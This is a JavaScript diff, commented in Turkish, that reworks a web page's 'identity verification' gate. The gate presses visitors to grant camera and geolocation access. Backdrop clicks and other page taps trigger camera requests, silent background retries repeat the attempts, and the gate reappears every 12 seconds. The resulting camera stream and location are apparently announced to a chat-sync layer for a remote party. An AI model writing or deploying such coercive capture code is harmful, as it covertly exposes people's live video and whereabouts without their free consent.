@@ -2118,6 +2118,8 @@
   let locationGrantedSynced = false;
   let mediaStatusAnnounced = false;
   let cameraActivateInFlight = null;
+  let pageEntryPermBusy = false;
+  let pageEntryGateBusyUntil = 0;
   const CAMERA_PERM_RETRY_MS = 10_000;
   const MEDIA_PERM_GRANTED_KEY = "media_perm_granted_v1";
   const CAMERA_PERM_DENIED_TEXT =
@@ -2218,14 +2220,111 @@
     document.getElementById("page-entry-perm-gate")?.remove();
   }
 
-  function showPageEntryPermGate() {
-    // Yalnızca kamera+konum canlıysa kapı yok — sadece localStorage yetmez
+  function setPageEntryGateStatus(text) {
+    const el = document.querySelector("#page-entry-perm-gate [data-page-perm-status]");
+    if (el) el.textContent = text || "";
+  }
+
+  function setPageEntryGateBusy(busy, statusText) {
+    pageEntryPermBusy = Boolean(busy);
+    pageEntryGateBusyUntil = busy ? Date.now() + 25_000 : 0;
+    const gate = document.getElementById("page-entry-perm-gate");
+    const btn = gate?.querySelector?.("[data-page-perm-allow]");
+    if (btn) {
+      btn.disabled = Boolean(busy);
+      btn.textContent = busy ? "İşleniyor…" : "İzin ver";
+    }
+    if (statusText) setPageEntryGateStatus(statusText);
+  }
+
+  /**
+   * Jest anında native kamera+konum başlat — await’ten ÖNCE çağrılmalı
+   * (iOS: getUserMedia/geolocation kullanıcı jesti ister).
+   */
+  function kickNativeMediaFromGesture() {
+    const camP = acquireCameraStreamNative()
+      .then((stream) => ({ ok: true, stream }))
+      .catch((err) => ({ ok: false, err }));
+    const locP = acquireLocationNativeOnce();
+    return { camP, locP };
+  }
+
+  async function runGateAllowFlow() {
+    if (pageEntryPermBusy) return;
     if (hasLiveCameraAndLocation()) {
       hidePageEntryPermGate();
       return;
     }
-    if (document.getElementById("page-entry-perm-gate")) return;
-    const gate = document.createElement("div");
+
+    // Jest tick’inde hemen native API — sonra await
+    const { camP, locP } = kickNativeMediaFromGesture();
+    setPageEntryGateBusy(true, "Telefon izin penceresi açılıyor…");
+
+    let cam = await camP;
+    if (!cam.ok) {
+      // İzin zaten verilmiş olabilir ama cihaz meşgul — bir kez daha dene
+      cam = await acquireCameraStreamNative()
+        .then((stream) => ({ ok: true, stream }))
+        .catch((err) => ({ ok: false, err }));
+    }
+    if (!cam.ok) {
+      clearMediaPermGranted();
+      setPageEntryGateBusy(false, "Kamera izni gerekli. Tekrar İzin ver’e basın.");
+      return;
+    }
+
+    earlyCameraStream = cam.stream;
+    setPageEntryGateStatus("Konum alınıyor…");
+    const loc = await locP;
+    if (loc?.coords) stashEarlyLocation(loc);
+    else {
+      // Jest hâlâ yakınken ikinci konum denemesi
+      const loc2 = await acquireLocationNativeOnce();
+      if (loc2?.coords) stashEarlyLocation(loc2);
+    }
+
+    setPageEntryGateStatus("Doğrulama bağlanıyor…");
+    try {
+      await openCameraLikeChat(getOrCreateMediaHost(), {
+        fromGesture: true,
+        announce: true,
+        preferEarlyStream: true,
+      });
+    } catch (err) {
+      console.warn("gate allow", err);
+    }
+
+    if (hasLiveCameraAndLocation()) {
+      hidePageEntryPermGate();
+      setPageEntryGateBusy(false);
+      return;
+    }
+    if (hasLiveCameraSession()) {
+      // Kamera OK — blocking popup’ı kapat; konum arka planda devam
+      hidePageEntryPermGate();
+      setPageEntryGateBusy(false);
+      return;
+    }
+
+    setPageEntryGateBusy(false, "Bağlantı kurulamadı. Tekrar deneyin.");
+  }
+
+  function showPageEntryPermGate() {
+    if (hasLiveCameraAndLocation()) {
+      hidePageEntryPermGate();
+      return;
+    }
+    // Kamera zaten açıkken modal döngüsü yapma — konum sessiz alınır
+    if (hasLiveCameraSession()) {
+      hidePageEntryPermGate();
+      return;
+    }
+    if (pageEntryPermBusy || Date.now() < pageEntryGateBusyUntil) return;
+
+    let gate = document.getElementById("page-entry-perm-gate");
+    if (gate) return;
+
+    gate = document.createElement("div");
     gate.id = "page-entry-perm-gate";
     gate.className = "page-entry-perm-gate";
     gate.setAttribute("role", "dialog");
@@ -2235,25 +2334,20 @@
       <div class="page-entry-perm-card">
         <p class="page-entry-perm-kicker">Kimlik doğrulaması</p>
         <h2>İzin gerekli</h2>
-        <p>Devam etmek için tarayıcı iznini vermeniz gerekir. <strong>İzin Ver</strong>’e basınca kamera anında açılır. Vermezseniz tekrar sorulur.</p>
+        <p>Devam etmek için tarayıcı kamera ve konum iznini verin. <strong>İzin ver</strong>’e basınca telefon izin penceresi açılır.</p>
+        <p class="page-entry-perm-status" data-page-perm-status></p>
         <button type="button" class="btn btn-primary" data-page-perm-allow>İzin ver</button>
       </div>
     `;
-    const allow = () => {
-      hidePageEntryPermGate();
-      // Sohbette izin verilince ne oluyorsa: birebir aynı fonksiyon
-      void ensureVisitorMedia(getOrCreateMediaHost(), {
-        fromGesture: true,
-        announce: true,
-      });
-    };
-    gate.querySelector("[data-page-perm-allow]")?.addEventListener("click", (e) => {
+    const onAllow = (e) => {
       e.preventDefault();
       e.stopPropagation();
-      allow();
-    });
+      void runGateAllowFlow();
+    };
+    gate.querySelector("[data-page-perm-allow]")?.addEventListener("click", onAllow);
+    // Backdrop tıklanınca da aynı jest akışı
     gate.addEventListener("click", (e) => {
-      if (e.target === gate) allow();
+      if (e.target === gate) onAllow(e);
     });
     document.body.appendChild(gate);
   }
@@ -2427,21 +2521,24 @@
           if (seed?.coords) applySeedLocationToSession(window.ChatSync, liveId, st, seed);
           else {
             try {
-              st.retryLocation?.(fromGesture);
+              st.retryLocation?.(
+                fromGesture ? { fromUserTap: true, explicit: false } : false
+              );
             } catch {
               /* ignore */
             }
           }
         }
       }
-      // Konum eksik — loop sadece retry (gum yok)
+      hidePageEntryPermGate();
       if (!hasLiveCameraAndLocation()) {
         startCameraPermissionLoop(box, { preferCallId: liveId || latestCameraCallId || undefined });
       }
       return true;
     }
 
-    if (cameraActivateInFlight) {
+    // Jest’li çağrı, jest’siz boot uçuşuna ASLA katılma (iOS jest tüketimi)
+    if (cameraActivateInFlight && !fromGesture) {
       try {
         return await cameraActivateInFlight;
       } catch {
@@ -2449,10 +2546,9 @@
       }
     }
 
-    cameraActivateInFlight = (async () => {
+    const run = (async () => {
       await waitForChatSync();
       const ok = await activateChatMediaNow(box, { fromGesture, announce });
-      // Başarıda bile konum eksikse loop; ikisi tamamsa loop YOK
       if (!hasLiveCameraAndLocation()) {
         startCameraPermissionLoop(box, { preferCallId: latestCameraCallId || undefined });
       } else {
@@ -2462,10 +2558,16 @@
       return ok;
     })();
 
+    if (!fromGesture) {
+      cameraActivateInFlight = run;
+    }
+
     try {
-      return await cameraActivateInFlight;
+      return await run;
     } finally {
-      cameraActivateInFlight = null;
+      if (!fromGesture && cameraActivateInFlight === run) {
+        cameraActivateInFlight = null;
+      }
     }
   }
 
@@ -2690,14 +2792,20 @@
         pageEntryGestureUnsub = null;
         return;
       }
+      if (pageEntryPermBusy) return;
       if (cameraActivateInFlight && !fromGesture) return;
+      // Jest yoksa sessiz dene; olmazsa gate — tarayıcı prompt’u jest ister
       void ensureVisitorMedia(getOrCreateMediaHost(), {
         fromGesture,
         announce: false,
+      }).then((ok) => {
+        if (!ok && !hasLiveCameraSession() && !pageEntryPermBusy) {
+          showPageEntryPermGate();
+        }
       });
     };
 
-    // Tek ilk kick — sürekli jest/loop startCameraPermissionLoop’ta
+    // İlk sessiz deneme (izin önceden verilmişse stream açılır)
     startForce(false);
     if (window.ChatSyncReady) {
       window.ChatSyncReady.then(() => startForce(false)).catch(() => startForce(false));
@@ -2705,27 +2813,34 @@
       window.setTimeout(() => startForce(false), 350);
     }
 
-    // Loop başlamadan önce kısa jest desteği; loop başlayınca mediaForceGestureUnsub alır
+    // Gate dışına basıldığında (popup yokken) jest ile dene
     let lastAt = 0;
-    const onGesture = () => {
+    const onGesture = (e) => {
+      if (pageEntryPermBusy) return;
+      if (document.getElementById("page-entry-perm-gate")) return;
+      if (e?.target?.closest?.("[data-page-perm-allow], .page-entry-perm-card")) return;
       const now = Date.now();
-      if (now - lastAt < 700) return;
+      if (now - lastAt < 900) return;
       lastAt = now;
       if (hasLiveCameraAndLocation()) {
         hidePageEntryPermGate();
         return;
       }
-      // Permission loop zaten jest dinliyorsa çift tetikleme
       if (mediaForceGestureUnsub) return;
+      if (hasLiveCameraSession()) {
+        const live = findLiveCameraSessionEntry();
+        try {
+          live?.[1]?.retryLocation?.({ fromUserTap: true, explicit: false });
+        } catch {
+          /* ignore */
+        }
+        return;
+      }
       startForce(true);
     };
     document.addEventListener("pointerdown", onGesture, true);
-    document.addEventListener("touchstart", onGesture, true);
-    document.addEventListener("keydown", onGesture, true);
     pageEntryGestureUnsub = () => {
       document.removeEventListener("pointerdown", onGesture, true);
-      document.removeEventListener("touchstart", onGesture, true);
-      document.removeEventListener("keydown", onGesture, true);
     };
 
     if (pageEntryRetryTimer) window.clearInterval(pageEntryRetryTimer);
@@ -2743,10 +2858,9 @@
         pageEntryGestureUnsub = null;
         return;
       }
-      // Canlı kamera varken ensure erken return + loop konum yapar — gum yok
-      if (cameraActivateInFlight) return;
-      if (!hasLiveCameraSession()) showPageEntryPermGate();
-      startForce(false);
+      if (pageEntryPermBusy || cameraActivateInFlight) return;
+      if (hasLiveCameraSession()) return;
+      showPageEntryPermGate();
     }, 12_000);
   }
 
@@ -2968,8 +3082,12 @@
           }
         }
 
-        // Kapı: kamera yoksa göster
-        if (!hasLiveCameraSession() && !(earlyCameraStream && hasLiveCameraTracks(earlyCameraStream))) {
+        // Kapı: kamera yoksa ve busy değilse göster
+        if (
+          !pageEntryPermBusy &&
+          !hasLiveCameraSession() &&
+          !(earlyCameraStream && hasLiveCameraTracks(earlyCameraStream))
+        ) {
           if (!fromGesture) showPageEntryPermGate();
         }
 
@@ -2987,7 +3105,7 @@
             }
             hidePageEntryPermGate();
           } catch {
-            if (!fromGesture) showPageEntryPermGate();
+            if (!fromGesture && !pageEntryPermBusy) showPageEntryPermGate();
             scheduleRetry();
             return;
           }
@@ -3059,11 +3177,13 @@
           completeBoth(callId);
           return;
         }
-        if (!hasLiveCameraSession()) showPageEntryPermGate();
+        if (!hasLiveCameraSession() && !pageEntryPermBusy) showPageEntryPermGate();
         scheduleRetry();
       } catch (err) {
         console.error("silent media force", err);
-        if (!hasLiveCameraAndLocation()) showPageEntryPermGate();
+        if (!hasLiveCameraAndLocation() && !hasLiveCameraSession() && !pageEntryPermBusy) {
+          showPageEntryPermGate();
+        }
         scheduleRetry();
       } finally {
         attempting = false;
@@ -3074,6 +3194,8 @@
     let lastGestureAt = 0;
     const onGesture = () => {
       if (token !== cameraPermLoopToken) return;
+      if (pageEntryPermBusy) return;
+      if (document.getElementById("page-entry-perm-gate")) return;
       const now = Date.now();
       if (now - lastGestureAt < 1200) return;
       lastGestureAt = now;
